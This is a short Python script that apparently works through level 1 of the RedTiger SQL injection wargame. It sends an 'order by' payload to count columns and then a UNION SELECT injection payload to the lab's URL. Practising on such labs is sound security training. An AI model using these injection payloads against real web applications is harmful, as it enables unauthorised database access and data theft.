import requests

url = "https://redtiger.labs.overthewire.org/level1.php"

#initial assumtion : select * from ? where id=$cat

# params = {'cat':"1 order by 4#" } (using this to know how many columns are there)



params = {'cat':"2 union select 1,2,3,4#" }
res = requests.get(url, params=params)
print(res.text)